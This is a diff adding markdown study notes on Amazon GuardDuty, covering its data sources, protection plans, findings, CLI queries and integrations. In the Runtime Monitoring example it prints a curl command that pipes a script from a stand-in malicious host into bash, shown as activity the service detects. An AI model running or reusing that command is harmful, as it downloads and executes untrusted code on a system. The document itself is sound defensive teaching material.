@@ -347,4 +347,364 @@ Security Hub integrates with many AWS services, either by **receiving** or **for
 * **Multi-Region Support**: You can configure cross-region aggregation for a global view.
 
 ---
+---
 
+# **Amazon GuardDuty – Threat Detection for AWS**
+## Overview
+Amazon GuardDuty is a **managed threat detection service** that helps protect your AWS accounts, workloads, and data. It provides **intelligent security monitoring** using **machine learning**, **anomaly detection**, and **threat intelligence**—with **minimal setup** and **no infrastructure to manage**.
+
+---
+
+## 🚀 Key Highlights
+
+### ✅ **Easy to Use**
+
+* **One-click activation** — No need for complex setup or agents.
+* **Out-of-the-box functionality** — Immediate insights without extra configurations.
+
+### 🔍 **How It Works**
+
+GuardDuty continuously analyzes **tens of billions of events per minute** from AWS data sources to:
+
+* Detect **suspicious behavior** or unauthorized activities.
+* Identify and **prioritize threats** based on context and risk.
+* Provide **security context** for faster incident response.
+
+### 🔗 **Integrated and Scalable**
+
+* Works across **EC2**, **ECS**, **EKS**, **AWS Lambda**, **RDS**, **Aurora**, and **S3**.
+* Seamless integration with **AWS services** like AWS Security Hub, Amazon EventBridge, and AWS Lambda for **automated remediation**.
+* Scales effortlessly across all your AWS resources.
+
+---
+
+## 🧠 Technologies Behind GuardDuty
+
+* **Machine Learning (ML)** to identify anomalies.
+* **Threat Intelligence Feeds** from AWS and partners (e.g., malicious IPs/domains, malware hashes).
+* **Contextual Analysis** for understanding threats in real time.
+
+---
+
+## ⚠️ What GuardDuty Can Detect
+
+| 🧨 Threat Type                          | 🔍 Description                                                                      |
+| --------------------------------------- | ----------------------------------------------------------------------------------- |
+| **Compromised Credentials**             | Detects if AWS access keys are stolen and misused.                                  |
+| **Data Exfiltration**                   | Flags data theft or destruction—potential signs of ransomware.                      |
+| **Unusual DB Access**                   | Anomalous login patterns in Aurora & RDS databases.                                 |
+| **Unauthorized Cryptomining**           | Identifies mining operations on EC2 & container instances.                          |
+| **Malware Presence**                    | Detects known malware in EC2, containers, and S3 file uploads.                      |
+| **Suspicious OS/Network/File Behavior** | Identifies OS-level intrusions on EKS, ECS (Fargate), EC2, and container workloads. |
+
+---
+
+## ✅ Benefits
+
+* **Continuous monitoring** across AWS accounts and regions.
+* **No agent required** – Fully managed.
+* **Fast threat response** with automated alerts and integrations.
+* **Improves security posture** with proactive threat detection.
+
+---
+
+Here is a **detailed and simplified documentation of Amazon GuardDuty features**, including easy-to-understand technical examples for each key capability:
+
+---
+
+# 🛡️ **Amazon GuardDuty – Features with Examples**
+
+Amazon GuardDuty is a smart threat detection service designed to monitor and protect your AWS environment. It uses machine learning, threat intelligence, and behavior analysis to identify security threats in real time.
+
+---
+
+## 🔁 1. **Continuous Monitoring of Foundational Data Sources**
+
+### ✅ Feature:
+
+GuardDuty automatically monitors three main AWS data sources:
+
+1. **AWS CloudTrail management events** – Tracks user activities like API calls.
+2. **VPC Flow Logs** – Logs traffic going in and out of your EC2 instances.
+3. **DNS Logs** – Tracks domain name lookups made by your resources.
+
+### 🔍 Example:
+
+Suppose an EC2 instance starts making DNS queries to a known malware domain (e.g., `bad-malware-site.ru`). GuardDuty detects this through DNS logs and alerts you with a finding like:
+
+> *"EC2 instance is communicating with a known command-and-control domain."*
+
+📘 No manual setup is required—just enable GuardDuty and it starts monitoring.
+
+---
+
+## 🧠 2. **Extended Threat Detection (Multi-Stage Attacks)**
+
+### ✅ Feature:
+
+Detects **attack chains** that span multiple logs, AWS services, or over time. It correlates events that might seem harmless individually but are dangerous when combined.
+
+### 🔍 Example:
+
+1. An attacker logs into your account using a compromised credential (CloudTrail log).
+2. Then launches a new EC2 instance (CloudTrail).
+3. That EC2 instance starts scanning internal IPs (VPC Flow Logs).
+
+GuardDuty pieces these events together and creates a single **attack sequence finding**, like:
+
+> *"Suspicious EC2 activity: Unauthorized access followed by lateral network scanning."*
+
+📘 Extended Threat Detection is **enabled by default** and has **no extra cost**.
+
+---
+
+## 🧩 3. **Use-Case Focused Protection Plans**
+
+GuardDuty offers optional "add-on" features for **specific AWS services** to enhance security.
+
+---
+
+### 🔐 **S3 Protection**
+
+Analyzes access patterns and newly uploaded files in your Amazon S3 buckets.
+
+#### 🔍 Example:
+
+If someone downloads hundreds of files in a short time from an S3 bucket, GuardDuty might flag:
+
+> *"Unusual data download from S3 bucket, possible exfiltration."*
+
+📘 Enable S3 protection to monitor **data access and potential leaks**.
+
+---
+
+### ☁️ **EKS Protection**
+
+Monitors Kubernetes API (audit logs) in Amazon EKS for suspicious behavior.
+
+#### 🔍 Example:
+
+A user tries to escalate privileges using `kubectl create clusterrolebinding`:
+
+> *"Kubernetes privilege escalation attempt in EKS cluster."*
+
+📘 Helps detect attacks like misconfigured roles or unauthorized deployments.
+
+---
+
+### 🧩 **Runtime Monitoring**
+
+Watches system-level activity (like file or process operations) in EC2, ECS (Fargate), and EKS.
+
+#### 🔍 Example:
+
+GuardDuty sees a suspicious shell command like:
+
+```bash
+curl http://malicious.com/backdoor.sh | bash
+```
+
+> *"Suspicious command execution detected in EC2."*
+
+📘 Useful for detecting malware, reverse shells, or script-based attacks.
+
+---
+
+### 🦠 **Malware Protection for EC2 (EBS Scanning)**
+
+Scans EBS volumes for known malware signatures.
+
+#### 🔍 Example:
+
+After a breach, you run a malware scan on EC2 and GuardDuty detects:
+
+> *"Malware signature matched in EBS volume attached to EC2 instance."*
+
+📘 Available as **on-demand or scheduled** scans.
+
+---
+
+### 🧪 **Malware Protection for S3**
+
+Scans newly uploaded S3 objects for malware.
+
+#### 🔍 Example:
+
+Someone uploads an infected ZIP file to an S3 bucket:
+
+> *"Malware detected in newly uploaded file to S3."*
+
+📘 You can use this feature **independently** without enabling full GuardDuty.
+
+---
+
+### 🗄️ **RDS Protection**
+
+Analyzes **login attempts** to Aurora and RDS databases for unusual behavior.
+
+#### 🔍 Example:
+
+Multiple failed login attempts from an IP in another country:
+
+> *"Brute-force login attempt on RDS instance."*
+
+📘 Protects your database from unauthorized access.
+
+---
+
+### ⚡ **Lambda Protection**
+
+Monitors **network activity** of Lambda functions, especially when running in VPC.
+
+#### 🔍 Example:
+
+A Lambda function connects to a known crypto mining domain:
+
+> *"AWS Lambda making outbound calls to known mining pool IP."*
+
+📘 Helps detect misuse of serverless compute for malicious purposes.
+
+---
+
+## 👥 4. **Multi-Account Management**
+
+### ✅ Feature:
+
+Centralized monitoring of multiple AWS accounts using:
+
+* **AWS Organizations** (recommended)
+* **Legacy invitation-based method**
+
+### 🔍 Example:
+
+You are a security admin for 10 AWS accounts. Set up GuardDuty in your org master account to monitor all others from one place.
+
+📘 Centralized view = simplified management and cost tracking.
+
+---
+
+## 🧾 5. **Security Findings and Sample Tests**
+
+### ✅ Feature:
+
+GuardDuty generates **detailed findings** when it detects a threat. Each finding includes:
+
+* Threat type and severity
+* Affected resources
+* Recommended action
+
+### 🔍 Example:
+
+> *"Recon\:EC2/PortProbeUnprotectedPort – An external IP is probing your EC2 port 22 (SSH).”*
+
+You can also:
+
+* Use **sample findings** for testing.
+* Use **tester scripts** to simulate scenarios.
+
+📘 Helps teams learn how to respond to real-world alerts.
+
+---
+
+## 📊 6. **Managing and Visualizing Findings**
+
+* View results in the **GuardDuty console dashboard**
+* Query findings using:
+
+  * **AWS CLI**
+  * **AWS SDK**
+  * **AWS Security Hub**
+
+### 🔍 Example:
+
+Security team pulls high-severity findings across accounts:
+
+```bash
+aws guardduty list-findings --severity-criteria "HIGH"
+```
+
+📘 Enables analysis, alerting, and custom dashboards (e.g., using CloudWatch or Grafana).
+
+---
+
+## 🔗 7. **Integration with AWS Security Services**
+
+### ✅ Integrated Services:
+
+| Service                | Benefit                                                |
+| ---------------------- | ------------------------------------------------------ |
+| **AWS Security Hub**   | Central view of findings across AWS security services  |
+| **Amazon Detective**   | Root cause analysis with visual timeline and graphs    |
+| **Amazon EventBridge** | Automated response via Lambda, SNS, or Systems Manager |
+
+### 🔍 Example:
+
+* When GuardDuty finds malware on EC2:
+
+  * Security Hub prioritizes it.
+  * Detective shows related actions (login, IP address).
+  * EventBridge triggers Lambda to isolate the instance.
+
+📘 Example Rule:
+
+```json
+{
+  "source": ["aws.guardduty"],
+  "detail-type": ["GuardDuty Finding"]
+}
+```
+
+---
+
+## ✅ 8. **PCI DSS Compliance**
+
+* GuardDuty is **Level 1 PCI DSS certified**.
+* Safe to use in environments where **credit card data** is processed or stored.
+
+📘 You can request the AWS PCI Compliance package from the AWS Artifact console.
+
+---
+
+## 🧪 9. **Testing and Validation**
+
+* Generate **sample findings** in the console.
+* Use **testing scripts** to simulate threats and test responses.
+
+### 🔍 Example:
+
+Generate test finding:
+
+```bash
+aws guardduty create-sample-findings --detector-id <your-detector-id>
+```
+
+---
+
+## 💰 Pricing & Trial
+
+* **Pay-as-you-go** – No upfront costs or commitments.
+* **30-day free trial** – Try GuardDuty risk-free.
+
+---
+
+## 📝 Final Notes:
+
+* 🧠 **Intelligent & Contextual:** Uses ML + threat feeds
+* 🔐 **Broad Coverage:** From EC2 to Lambda, S3 to EKS
+* ⚙️ **Automation Friendly:** With EventBridge and Security Hub
+
+---
+
+## 📌 Getting Started
+
+1. Go to the **Amazon GuardDuty console**.
+2. Click **"Enable GuardDuty"** for your account.
+3. (Optional) Integrate with AWS Organizations to monitor multiple accounts.
+
+## 🔗 Useful Links
+
+* [Amazon GuardDuty Official Documentation](https://docs.aws.amazon.com/guardduty/latest/ug/what-is-guardduty.html)
+* [Getting Started with GuardDuty](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty-getting-started.html)
+* [GuardDuty Pricing](https://aws.amazon.com/guardduty/pricing/)
+
+---
